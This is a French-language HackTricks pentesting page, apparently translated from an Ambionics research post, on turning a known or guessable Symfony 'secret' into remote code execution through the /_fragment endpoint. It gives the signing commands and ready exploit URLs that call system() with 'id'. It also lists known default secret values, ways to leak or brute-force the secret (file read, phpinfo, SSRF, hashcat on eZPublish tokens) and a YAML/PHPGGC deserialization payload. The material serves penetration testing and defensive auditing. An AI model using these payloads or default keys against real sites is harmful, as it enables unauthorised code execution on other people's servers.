## Symfony

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Travaillez-vous dans une entreprise de cybers√©curit√© ? Voulez-vous voir votre entreprise annonc√©e dans HackTricks ? ou voulez-vous avoir acc√®s √† la derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Introduction <a href="#introduction" id="introduction"></a>

Depuis sa cr√©ation en 2008, l'utilisation du framework [Symfony](https://symfony.com) a √©t√© de plus en plus utilis√©e dans les applications bas√©es sur PHP. Il est maintenant un composant central de nombreux CMS bien connus, tels que [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anciennement eZPublish) ou [Bolt](https://bolt.cm), et est souvent utilis√© pour construire des sites web personnalis√©s.

L'une des fonctionnalit√©s int√©gr√©es de Symfony, con√ßue pour g√©rer les [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), est la classe [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Essentiellement, lorsqu'une personne √©met une demande √† `/_fragment`, cet auditeur d√©finit les attributs de la demande √† partir des param√®tres GET donn√©s. Comme cela permet d'ex√©cuter du code PHP arbitraire (_plus d'informations √† ce sujet plus tard_), la demande doit √™tre sign√©e √† l'aide d'une valeur HMAC. La cl√© cryptographique secr√®te de ce HMAC est stock√©e sous une valeur de configuration Symfony nomm√©e `secret`.

Cette valeur de configuration, `secret`, est √©galement utilis√©e, par exemple, pour construire des jetons CSRF et des jetons de rappel. √âtant donn√© son importance, cette valeur doit √©videmment √™tre tr√®s al√©atoire.

Malheureusement, nous avons d√©couvert que souvent, le secret a soit une **valeur par d√©faut**, soit il existe des **moyens d'obtenir la valeur, de la bruteforcer hors ligne, ou de simplement contourner la v√©rification de s√©curit√© √† laquelle elle est associ√©e**. Cela affecte notamment Bolt, eZPlatform et eZPublish.

Bien que cela puisse sembler √™tre un probl√®me de configuration b√©nin, nous avons constat√© que des valeurs par d√©faut, brutefor√ßables ou devinables sont **tr√®s, tr√®s souvent pr√©sentes** dans les CMS mentionn√©s ainsi que dans les applications personnalis√©es. Cela est principalement d√ª au fait de ne pas mettre suffisamment l'accent sur son importance dans la documentation ou les guides d'installation.

De plus, un attaquant peut escalader des vuln√©rabilit√©s moins impactantes pour lire le `secret` (par le biais d'une divulgation de fichier), contourner le processus de signature `/_fragment` (en utilisant un SSRF) et m√™me le divulguer via `phpinfo()` !

Dans ce billet de blog, nous d√©crirons comment le secret peut √™tre obtenu dans divers CMS et sur le framework de base, et comment obtenir l'ex√©cution de code √† l'aide de ce secret.

## Un peu d'histoire <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

√âtant un framework moderne, Symfony a d√ª g√©rer la g√©n√©ration de sous-parties d'une demande depuis sa cr√©ation jusqu'√† nos jours. Avant `/_fragment`, il y avait `/_internal` et `/_proxy`, qui faisaient essentiellement la m√™me chose. Cela a produit de nombreuses vuln√©rabilit√©s au fil des ans : [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy) et [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), par exemple.

Depuis Symfony 4, le secret est g√©n√©r√© √† l'installation et la page `/_fragment` est d√©sactiv√©e par d√©faut. On pourrait donc penser que la conjonction d'avoir √† la fois une valeur `secret` faible et `/_fragment` activ√© serait rare. Ce n'est pas le cas : de nombreux frameworks s'appuient sur d'anciennes versions de Symfony (m√™me la version 2.x est encore tr√®s pr√©sente), et impl√©mentent soit une valeur `secret` statique, soit la g√©n√®rent mal. De plus, de nombreux frameworks s'appuient sur ESI et activent donc la page `/_fragment`. De plus, comme nous le verrons, d'autres vuln√©rabilit√©s de moindre impact peuvent permettre de r√©cup√©rer le secret, m√™me s'il a √©t√© g√©n√©r√© de mani√®re s√©curis√©e.

## Ex√©cution de code √† l'aide de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Nous allons d'abord d√©montrer comment un attaquant, ayant connaissance de la valeur de configuration `secret`, peut obtenir l'ex√©cution de code. Cela est fait pour la derni√®re version de `symfony/http-kernel`, mais est similaire pour d'autres versions.

### Utilisation de `/_fragment` pour ex√©cuter du code arbitraire <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Comme mentionn√© pr√©c√©demment, nous utiliserons la page `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    public function onKernelRequest(RequestEvent $event)
    {
        $request = $event->getRequest();

        # [1]
        if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
            return;
        }

        if ($request->attributes->has('_controller')) {
            // Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
            $request->query->remove('_path');

            return;
        }

        # [2]
        if ($event->isMasterRequest()) {
            $this->validateRequest($request);
        }

        # [3]
        parse_str($request->query->get('_path', ''), $attributes);
        $request->attributes->add($attributes);
        $request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
        $request->query->remove('_path');
    }
}
```
`FragmentListener:onKernelRequest` sera ex√©cut√© √† chaque requ√™te : si le chemin de la requ√™te est `/_fragment` \[1], la m√©thode v√©rifiera d'abord que la requ√™te est valide (_c.-√†-d._ correctement sign√©e), et l√®vera une exception sinon \[2]. Si les v√©rifications de s√©curit√© r√©ussissent, elle analysera le param√®tre `_path` encod√© en URL et d√©finira les attributs `$request` en cons√©quence.

Les attributs de requ√™te ne doivent pas √™tre confondus avec les param√®tres de requ√™te HTTP : ce sont des valeurs internes, maintenues par Symfony, qui ne peuvent g√©n√©ralement pas √™tre sp√©cifi√©es par un utilisateur. L'un de ces attributs de requ√™te est `_controller`, qui sp√©cifie quel contr√¥leur Symfony (un tuple _(classe, m√©thode)_ ou simplement une _fonction_) doit √™tre appel√©. Les attributs dont le nom ne commence pas par `_` sont des arguments qui seront transmis au contr√¥leur. Par exemple, si nous voulions appeler cette m√©thode :
```php
class SomeClass
{
    public function someMethod($firstMethodParam, $secondMethodParam)
    {
        ...
    } 
}
```
Nous avons d√©fini `_path` comme suit :

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

La requ√™te ressemblerait alors √† ceci :

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

Essentiellement, cela permet d'appeler n'importe quelle fonction ou m√©thode de n'importe quelle classe, avec n'importe quel param√®tre. √âtant donn√© la pl√©thore de classes que Symfony poss√®de, **l'obtention d'une ex√©cution de code est triviale**. Nous pouvons, par exemple, appeler `system()` :

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Appeler system ne fonctionnera pas √† chaque fois : reportez-vous √† la section Exploitation pour plus de d√©tails sur les subtilit√©s de l'exploitation._

Un probl√®me reste : comment Symfony v√©rifie-t-il la signature de la requ√™te ?

### Signature de l'URL <a href="#signing-the-url" id="signing-the-url"></a>

Pour v√©rifier la signature d'une URL, un HMAC est calcul√© sur l'URL _compl√®te_. Le hash obtenu est ensuite compar√© √† celui sp√©cifi√© par l'utilisateur.

En termes de code, cela se fait en deux endroits :
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // is the Request signed?
        if ($this->signer->checkRequest($request)) {
            return;
        }

        # [3]
        throw new AccessDeniedHttpException();
    }
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
    public function checkRequest(Request $request): bool
    {
        $qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
    }

    /**
     * Checks that a URI contains the correct hash.
     *
     * @return bool True if the URI is signed correctly, false otherwise
     */
    public function check(string $uri)
    {
        $url = parse_url($uri);
        if (isset($url['query'])) {
            parse_str($url['query'], $params);
        } else {
            $params = [];
        }

        if (empty($params[$this->parameter])) {
            return false;
        }

        $hash = $params[$this->parameter];
        unset($params[$this->parameter]);

        # [2]
        return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
    }

    private function computeHash(string $uri): string
    {
        # [1]
        return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
    }

    private function buildUrl(array $url, array $params = []): string
    {
        ksort($params, SORT_STRING);
        $url['query'] = http_build_query($params, '', '&');

        $scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
        $host = isset($url['host']) ? $url['host'] : '';
        $port = isset($url['port']) ? ':'.$url['port'] : '';
        $user = isset($url['user']) ? $url['user'] : '';
        $pass = isset($url['pass']) ? ':'.$url['pass'] : '';
        $pass = ($user || $pass) ? "$pass@" : '';
        $path = isset($url['path']) ? $url['path'] : '';
        $query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
        $fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

        return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
    }
}
```
En bref, Symfony extrait le param√®tre GET `_hash`, puis reconstruit l'URL compl√®te, par exemple `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcule un HMAC √† partir de cette URL en utilisant la `secret` comme cl√© \[1], et le compare √† la valeur de hachage donn√©e \[2]. S'ils ne correspondent pas, une exception `AccessDeniedHttpException` est lev√©e \[3], ce qui entra√Æne une erreur `403`.

### Exemple <a href="#example" id="example"></a>

Pour tester cela, configurons un environnement de test et extrayons la cl√© secr√®te (dans ce cas, g√©n√©r√©e de mani√®re al√©atoire).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Maintenant, en visitant `http://localhost:8000/_fragment`, on obtient une erreur `403`. Essayons maintenant de fournir une signature valide:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
En v√©rifiant `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, nous avons maintenant un code d'√©tat `404`. La signature √©tait correcte, mais nous n'avons sp√©cifi√© aucun attribut de requ√™te, donc Symfony ne trouve pas notre contr√¥leur.

Puisque nous pouvons appeler n'importe quelle m√©thode, avec n'importe quel argument, nous pouvons par exemple choisir `system($command, $return_value)`, et fournir une charge utile comme ceci:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Nous pouvons maintenant visiter l'URL d'exploitation : `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

Malgr√© l'erreur `500`, nous pouvons voir que **notre commande a √©t√© ex√©cut√©e**.

_RCE en utilisant un fragment_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Trouver des secrets <a href="#finding-secrets" id="finding-secrets"></a>

Encore une fois : tout cela n'aurait pas d'importance si les secrets n'√©taient pas obtenables. Souvent, ils le sont. Nous d√©crirons plusieurs fa√ßons d'obtenir l'ex√©cution de code sans aucune connaissance pr√©alable.

### √Ä travers les vuln√©rabilit√©s <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Commen√ßons par l'√©vidence : utiliser des vuln√©rabilit√©s √† faible impact pour obtenir le secret.

#### Lecture de fichiers <a href="#file-read" id="file-read"></a>

De toute √©vidence, une vuln√©rabilit√© de lecture de fichiers pourrait √™tre utilis√©e pour lire les fichiers suivants et obtenir `secret` :

* `app/config/parameters.yml`
* `.env`

_√Ä titre d'exemple, certains outils de d√©bogage Symfony vous permettent de lire des fichiers._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

Sur les versions r√©centes de Symfony (3.x), `secret` est stock√© dans `.env` en tant que `APP_SECRET`. Comme il est ensuite import√© en tant que variable d'environnement, ils peuvent √™tre vus via une page `phpinfo()`.

_Fuite de APP\_SECRET via phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Cela peut notamment √™tre fait via le package de profilage de Symfony, comme le montre la capture d'√©cran.

#### SSRF / IP spoofing (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

Le code derri√®re `FragmentListener` a √©volu√© au fil des ans : jusqu'√† la version _2.5.3_, lorsque la demande provenait d'un proxy de confiance (c'est-√†-dire `localhost`), elle √©tait consid√©r√©e comme s√ªre, et donc le hachage ne serait pas v√©rifi√©. Un SSRF, par exemple, peut permettre d'ex√©cuter imm√©diatement du code, ind√©pendamment de la possession de `secret` ou non. Cela affecte notamment eZPublish jusqu'√† 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
    protected function validateRequest(Request $request)
    {
        // is the Request safe?
        if (!$request->isMethodSafe()) {
            throw new AccessDeniedHttpException();
        }

        // does the Request come from a trusted IP?
        $trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
        $remoteAddress = $request->server->get('REMOTE_ADDR');
        if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
            return;
        }

        // is the Request signed?
        // we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
        if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
            return;
        }

        throw new AccessDeniedHttpException();
    }

    protected function getLocalIpAddresses()
    {
        return array('127.0.0.1', 'fe80::1', '::1');
    }
```
Il faut admettre que toutes ces techniques n√©cessitent une autre vuln√©rabilit√©. Plongeons dans un vecteur encore meilleur : les valeurs par d√©faut.

### √Ä travers les valeurs par d√©faut <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43 : `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Lors de la configuration d'un site web Symfony, la premi√®re √©tape consiste √† installer le squelette [symfony-standard](https://github.com/symfony/symfony-standard). Lors de l'installation, une invite demande certaines valeurs de configuration. Par d√©faut, la cl√© est `ThisTokenIsNotSoSecretChangeIt`.

_Installation de Symfony via composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

Dans les versions ult√©rieures (4+), la cl√© secr√®te est g√©n√©r√©e de mani√®re s√©curis√©e.

#### ezPlatform 3.x (derni√®re version) : `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), le successeur de [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), utilise toujours Symfony. Le 10 juin 2019, un [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) a d√©fini la cl√© par d√©faut √† `ff6dc61a329dc96652bb092ec58981f7`. Les versions vuln√©rables vont de 3.0-alpha1 √† 3.1.1 (actuelle).

Bien que la [documentation](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) indique que la cl√© secr√®te doit √™tre modifi√©e, cela n'est pas obligatoire.

#### ezPlatform 2.x : `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Comme le squelette de Symfony, une invite vous demandera d'entrer une cl√© secr√®te lors de l'installation. La valeur par d√©faut est `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (derni√®re version) : `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) utilise [Silex](https://github.com/silexphp/Silex), un micro-framework obsol√®te bas√© sur Symfony. Il configure la cl√© secr√®te en utilisant ce calcul :
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Ainsi, on peut deviner le secret, ou utiliser une vuln√©rabilit√© de divulgation de chemin complet pour le calculer.

Si vous n'avez pas r√©ussi avec les cl√©s secr√®tes par d√©faut, ne d√©sesp√©rez pas : il y a d'autres moyens.

### Bruteforce <a href="#bruteforce" id="bruteforce"></a>

Comme le secret est souvent d√©fini manuellement (par opposition √† une valeur al√©atoire g√©n√©r√©e), les gens utilisent souvent une phrase secr√®te au lieu d'une valeur al√©atoire s√©curis√©e, ce qui la rend brute-for√ßable si nous avons un hachage pour la brute-forcer. √âvidemment, une URL `/_fragment` valide, telle que celle g√©n√©r√©e par Symfony, nous fournirait un tuple message-hachage valide pour brute-forcer le secret.

_Une demande valide au fragment est incluse dans la r√©ponse_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

Au d√©but de ce billet de blog, nous avons dit que le secret de Symfony avait plusieurs utilisations. L'une de ces utilisations est qu'il est √©galement utilis√© pour g√©n√©rer des jetons CSRF. Une autre utilisation de `secret` est de signer les cookies de rappel. Dans certains cas, un attaquant peut utiliser son propre jeton CSRF ou cookie de rappel pour brute-forcer la valeur de `secret`.

_La r√©tro-ing√©nierie de la construction de ces jetons est laiss√©e en exercice au lecteur._

### Aller plus loin : eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

√Ä titre d'exemple de la fa√ßon dont les secrets peuvent √™tre brute-forc√©s afin d'obtenir une ex√©cution de code, nous verrons comment nous pouvons d√©couvrir le secret d'eZPublish 2014.07.

#### Trouver du mat√©riel de brute-force <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublish g√©n√®re ses jetons CSRF de cette mani√®re :
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Pour construire ce jeton, eZP utilise deux valeurs que nous connaissons, ainsi que le secret : `getIntention()` est l'action que l'utilisateur tente de r√©aliser (`authentifier`, par exemple), `session_id()` est l'identifiant de session PHP, et `getSecret()`, eh bien, c'est le `secret` de Symfony.

Comme les jetons CSRF peuvent √™tre trouv√©s sur certains formulaires, nous avons maintenant le mat√©riel n√©cessaire pour forcer le secret.

Malheureusement, ezPublish a incorpor√© un bundle de sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Ce package s'assure que la cl√© secr√®te est al√©atoire. Il la g√©n√®re ainsi, lors de l'installation :
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
    return hash('sha1', uniqid(mt_rand()));
}
```
Cela semble vraiment difficile √† bruteforcer : `mt_rand()` peut produire 231 valeurs diff√©rentes, et `uniqid()` est construit √† partir de l'horodatage actuel (avec des microsecondes).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Divulgation de l'horodatage <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Heureusement, nous savons que ce secret est g√©n√©r√© √† la derni√®re √©tape de l'installation, juste apr√®s la mise en place du site web. Cela signifie que nous pouvons probablement divulguer l'horodatage utilis√© pour g√©n√©rer ce hash.

Une fa√ßon de le faire est d'utiliser les journaux (_par exemple_ `/var/log/storage.log`); on peut divulguer la premi√®re fois qu'une entr√©e de cache a √©t√© cr√©√©e. L'entr√©e de cache est cr√©√©e juste apr√®s l'appel de `generateRandomSecret()`.

_Contenu d'un journal d'exemple: l'horodatage est similaire √† celui utilis√© pour calculer le secret_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Si les journaux ne sont pas disponibles, on peut utiliser le moteur de recherche tr√®s puissant d'eZPublish pour trouver l'heure de cr√©ation du tout premier √©l√©ment du site web. En effet, lors de la cr√©ation du site, de nombreux horodatages sont mis dans la base de donn√©es. Cela signifie que l'horodatage des donn√©es initiales du site eZPublish est le m√™me que celui utilis√© pour calculer `uniqid()`. Nous pouvons chercher le _ContentObject_ `landing_page` et d√©couvrir son horodatage.

## Bruteforcer les bits manquants <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Nous sommes maintenant conscients de l'horodatage utilis√© pour calculer le secret, ainsi que d'un hash de la forme suivante:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Cela nous laisse un total de 231 \* 106 possibilit√©s. Cela semble faisable avec [hashcat](https://hashcat.net) et un bon ensemble de GPU, mais hashcat ne fournit pas de noyau `sha1(sha1($pass).$salt)`. Heureusement, nous l'avons impl√©ment√© ! Vous pouvez trouver [la demande de tirage ici](https://github.com/hashcat/hashcat/pull/2536).

En utilisant notre machine de craquage, qui dispose de 8 GPU, nous pouvons craquer ce hash en _moins de 20 heures_.

Apr√®s avoir obtenu le hash, nous pouvons utiliser `/_fragment` pour ex√©cuter du code.

## Conclusion <a href="#conclusion" id="conclusion"></a>

Symfony est maintenant un composant central de nombreuses applications PHP. En tant que tel, tout risque de s√©curit√© qui affecte le framework affecte de nombreux sites web. Comme le d√©montre cet article, une cl√© secr√®te faible ou une vuln√©rabilit√© moins importante permet aux attaquants d'obtenir une **ex√©cution de code √† distance**.

En tant que membre de l'√©quipe de s√©curit√©, vous devriez examiner tous vos sites web d√©pendant de Symfony. Un logiciel √† jour ne peut √™tre exclu pour les vuln√©rabilit√©s, car la cl√© secr√®te est g√©n√©r√©e lors de la premi√®re installation du produit. Ainsi, si vous avez cr√©√© un site web bas√© sur Symfony 3.x il y a quelques ann√©es et que vous l'avez maintenu √† jour tout au long du processus, il y a de fortes chances que la cl√© secr√®te soit toujours celle par d√©faut.

## Exploitation <a href="#exploitation" id="exploitation"></a>

### Th√©orie <a href="#theory" id="theory"></a>

D'une part, nous avons quelques choses √† craindre lors de l'exploitation de cette vuln√©rabilit√© :

* L'HMAC est calcul√© en utilisant l'**URL compl√®te**. Si le site web est derri√®re un proxy inverse, nous devons utiliser l'URL interne du service au lieu de celle √† laquelle nous envoyons notre charge utile. Par exemple, l'URL interne pourrait √™tre en HTTP au lieu de HTTPS.
* L'algorithme HMAC a chang√© au fil des ans : il √©tait **SHA-1** avant, et est maintenant **SHA-256**.
* Comme Symfony supprime le param√®tre `_hash` de la requ√™te, puis g√©n√®re √† nouveau l'URL, nous devons calculer le hash sur la m√™me URL qu'elle.
* De nombreux secrets peuvent √™tre utilis√©s, nous devons donc tous les v√©rifier.
* Sur certaines versions de PHP, nous ne pouvons pas appeler des fonctions qui ont des param√®tres "par r√©f√©rence", comme `system($command, &$return_value)`.
* Sur certaines versions de Symfony, `_controller` ne peut pas √™tre une fonction, il doit s'agir d'une m√©thode. Nous devons trouver une m√©thode Symfony qui nous permet d'ex√©cuter du code.

D'autre part, nous pouvons profiter de quelques choses :

* Atteindre `/_fragment` sans param√®tres, ou avec un hash invalide, devrait renvoyer un `403`.
* Atteindre `/_fragment` avec un hash valide mais sans un contr√¥leur valide devrait donner un `500`.

Le dernier point nous permet de tester les valeurs secr√®tes sans nous soucier de la fonction ou de la m√©thode que nous allons appeler ensuite.

### Pratique <a href="#practice" id="practice"></a>

Disons que nous attaquons `https://target.com/_fragment`. Pour pouvoir signer correctement une URL, nous avons besoin de conna√Ætre :

* URL interne : cela pourrait √™tre `https://target.com/_fragment`, ou peut-√™tre `http://target.com/_fragment`, ou quelque chose de compl√®tement diff√©rent (_par exemple_ `http://target.website.internal`), que nous ne pouvons pas deviner
* Cl√© secr√®te : nous avons une liste de cl√©s secr√®tes habituelles, telles que `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algorithme : SHA1 ou SHA256

Nous n'avons pas besoin de nous soucier de la charge utile effective (le contenu de `_path`) pour l'instant, car une URL correctement sign√©e ne donnera pas lieu √† une `AccessDeniedHttpException`, et ne donnera donc pas lieu √† un `403`. L'exploit va donc essayer chaque combinaison `(algorithme, URL, secret)`, g√©n√©rer une URL et v√©rifier si elle ne renvoie pas un code d'√©tat `403`.

_Une demande valide √† `/_fragment`, sans le param√®tre `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

√Ä ce stade, nous pouvons signer n'importe quelle URL `/_fragment`, ce qui signifie qu'il s'agit d'une RCE garantie. Il s'agit simplement de savoir quoi appeler.

Ensuite, nous devons savoir si nous pouvons appeler une fonction directement, ou si nous devons utiliser une m√©thode de classe. Nous pouvons d'abord essayer la premi√®re m√©thode la plus simple, en utilisant une fonction telle que `phpinfo ([ int $what = INFO_ALL ] )` ([documentation](https://www.php.net/manual/en/function.phpinfo.php)). Le param√®tre GET `_path` ressemblerait √† cela :
```
_controller=phpinfo
&what=-1
```
Et l'URL ressemblerait √† ceci :

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Si la r√©ponse HTTP affiche une page `phpinfo()`, nous avons r√©ussi. Nous pouvons alors essayer d'utiliser une autre fonction, telle que `assert` :

_Exemple de sortie en utilisant `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

Sinon, cela signifie que nous devrons utiliser une m√©thode de classe √† la place. Un bon candidat pour cela est `Symfony\Component\Yaml\Inline::parse`, qui est une classe Symfony int√©gr√©e, et en tant que telle est pr√©sente sur les sites Symfony.

√âvidemment, cette m√©thode analyse une cha√Æne d'entr√©e YAML. Le parseur YAML de Symfony prend en charge la balise `php/object`, qui convertira une cha√Æne d'entr√©e s√©rialis√©e en un objet en utilisant `unserialize()`. Cela nous permet d'utiliser notre outil PHP pr√©f√©r√©, [PHPGGC](https://github.com/ambionics/phpggc) !

Le prototype de la m√©thode a chang√© au fil des ans. Par exemple, voici trois prototypes diff√©rents :
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
Au lieu de construire `_path` pour chacun de ces √©l√©ments, nous pouvons profiter du fait que si nous donnons un argument dont le nom ne correspond pas au prototype de la m√©thode, il sera ignor√©. Nous pouvons donc ajouter tous les arguments possibles √† la m√©thode, sans nous soucier du prototype r√©el.

Nous pouvons donc construire `_path` comme ceci:
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
Encore une fois, nous pouvons essayer avec `phpinfo()` et voir si cela fonctionne. Si c'est le cas, nous pouvons utiliser `system()` √† la place.

_Exemple de sortie en utilisant `Inline::parse` avec une charge utile s√©rialis√©e_

